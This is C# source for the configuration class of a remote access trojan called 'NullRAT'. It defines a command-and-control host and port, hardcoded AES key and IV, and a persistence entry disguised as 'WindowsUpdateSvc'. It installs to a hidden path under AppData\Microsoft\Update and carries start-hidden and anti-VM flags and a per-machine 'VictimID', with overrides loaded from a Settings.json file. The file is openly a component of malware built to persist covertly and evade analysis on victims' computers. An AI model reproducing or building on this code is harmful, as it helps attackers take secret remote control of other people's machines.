using System;
using System.IO;
using System.Text.Json;

namespace NullRAT.Config
{
    public static class Config
    {
        public static string ServerIP { get; private set; } = "127.0.0.1"; // Change to your host
        public static int ServerPort { get; private set; } = 4444;

        public static string AESKey { get; private set; } = "NullRAT_16ByteKey!";
        public static string AESIV { get; private set; } = "NullRAT_16ByteIV!!";

        public static string MutexName { get; private set; } = "NullRAT_SingleInstance";
        public static string StartupName { get; private set; } = "WindowsUpdateSvc";
        public static bool AutoPersist { get; private set; } = true;

        public static int ReconnectDelay { get; private set; } = 5000;
        public static int HeartbeatMs { get; private set; } = 10000;
        public static bool StartHidden { get; private set; } = true;
        public static bool AntiVM { get; private set; } = true;

        public static string VictimID { get; private set; } = Environment.MachineName + "_" + new Random().Next(1000, 9999);

        public static string InstallPath { get; private set; } = 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
                        @"Microsoft\Update\NullRAT.exe");

        public static void Load()
        {
            string configPath = "Settings.json";

            if (!File.Exists(configPath))
            {
                Console.WriteLine("[!] Settings.json not found. Using defaults.");
                return;
            }

            try
            {
                string json = File.ReadAllText(configPath);
                using JsonDocument doc = JsonDocument.Parse(json);
                var root = doc.RootElement;

                if (root.TryGetProperty("Server", out var server))
                {
                    ServerIP = server.GetProperty("Host").GetString() ?? ServerIP;
                    ServerPort = server.GetProperty("Port").GetInt32();
                }

                if (root.TryGetProperty("Encryption", out var enc))
                {
                    AESKey = enc.GetProperty("AESKey").GetString() ?? AESKey;
                    AESIV = enc.GetProperty("AESIV").GetString() ?? AESIV;
                }

                if (root.TryGetProperty("Client", out var client))
                {
                    MutexName = client.GetProperty("Mutex").GetString() ?? MutexName;
                    StartupName = client.GetProperty("StartupName").GetString() ?? StartupName;
                    AutoPersist = client.GetProperty("AutoPersist").GetBoolean();
                }

                if (root.TryGetProperty("Behavior", out var behavior))
                {
                    ReconnectDelay = behavior.GetProperty("ReconnectDelayMs").GetInt32();
                    HeartbeatMs = behavior.GetProperty("HeartbeatMs").GetInt32();
                    StartHidden = behavior.GetProperty("StartHidden").GetBoolean();
                    AntiVM = behavior.GetProperty("AntiVM").GetBoolean();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Config load error: {ex.Message}");
            }
        }
    }
}